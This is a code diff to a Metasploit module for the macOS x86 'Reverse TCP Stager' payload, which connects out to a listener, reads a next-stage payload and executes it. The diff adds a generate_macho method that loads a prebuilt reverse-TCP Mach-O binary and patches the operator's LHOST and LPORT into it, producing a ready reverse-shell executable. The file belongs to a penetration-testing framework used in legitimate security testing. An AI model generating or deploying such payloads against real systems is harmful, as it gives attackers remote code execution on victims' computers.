@@ -17,17 +17,18 @@ require 'msf/core/handler/reverse_tcp'
 module Metasploit3
 
   include Msf::Payload::Stager
+  include Msf::Payload::Osx
 
   def initialize(info = { })
     super(merge_info(info,
-      'Name'		=> 'Reverse TCP Stager',
-      'Description'	=> 'Connect, read length, read buffer, execute',
-      'Author'	=> 'ddz',
-      'License'	=> MSF_LICENSE,
-      'Platform'	=> 'osx',
-      'Arch'		=> ARCH_X86,
-      'Handler'	=> Msf::Handler::ReverseTcp,
-      'Convention'	=> 'sockedi',
+      'Name'    => 'Reverse TCP Stager',
+      'Description' => 'Connect, read length, read buffer, execute',
+      'Author'  => ['ddz', 'anwarelmakrahy'],
+      'License' => MSF_LICENSE,
+      'Platform'  => 'osx',
+      'Arch'    => ARCH_X86,
+      'Handler' => Msf::Handler::ReverseTcp,
+      'Convention'  => 'sockedi',
       'Stager'        =>
       {
         'Offsets' =>
@@ -57,9 +58,13 @@ module Metasploit3
   end
 
   def handle_intermediate_stage(conn, p)
-    #
-    # Our stager payload expects to see a next-stage length first.
-    #
     conn.put([p.length].pack('V'))
+  end
+
+  def generate_macho
+    bin = File.read(File.join(Msf::Config.data_directory, 'osx', 'reverse_tcp_x86.bin'), {:mode => 'rb'})
+    string_sub(bin, 'XXXX127.0.0.1           ', "XXXX" + datastore['LHOST'].to_s) if datastore['LHOST']
+    string_sub(bin, 'YYYY4444                ', "YYYY" + datastore['LPORT'].to_s) if datastore['LPORT']
+    bin
   end
 end
